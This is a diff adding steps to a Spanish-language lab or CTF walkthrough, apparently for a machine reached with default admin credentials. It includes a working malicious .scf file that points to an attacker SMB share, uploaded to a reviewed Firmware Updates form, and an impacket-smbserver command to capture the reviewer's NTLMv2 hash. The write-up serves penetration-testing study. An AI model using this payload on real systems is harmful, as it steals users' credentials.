@@ -30,4 +30,20 @@ Accedemos a la IP a traves del navegador y probamos a acceder usando `admin::adm
 
 Nos encontramos en la web en la zona de Firmware Updates con un mensaje que nos dice que el contenido que subamos va a ser visualizado por otro usuario
 
-Crearemos un fichero `.scf` ya que al subir un archivo y un segundo usuario revisarlo, se puede cargar un fichero malicioso de este tipo, a la hora de que a la hora de llamar 
+Crearemos un fichero `.scf` ya que al subir un archivo y un segundo usuario revisarlo, se puede cargar un fichero malicioso de este tipo, a la hora de que a la hora de llamar al archivo poder obtener el hash `NTLMv2`
+
+El fichero deberá de tener el siguiente contenido
+```shell
+[Shell]
+Command=2
+IconFile=\\10.10.15.165\smbfolder\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+```
+
+Nos lo compartiremos como recurso de red con [[IMPACKET]]
+```shell
+impacket-smbserver smbfolder $(pwd) -smb2support
+```
+
+Lo subiremos y podremos obtener el hash `NTLMv2`
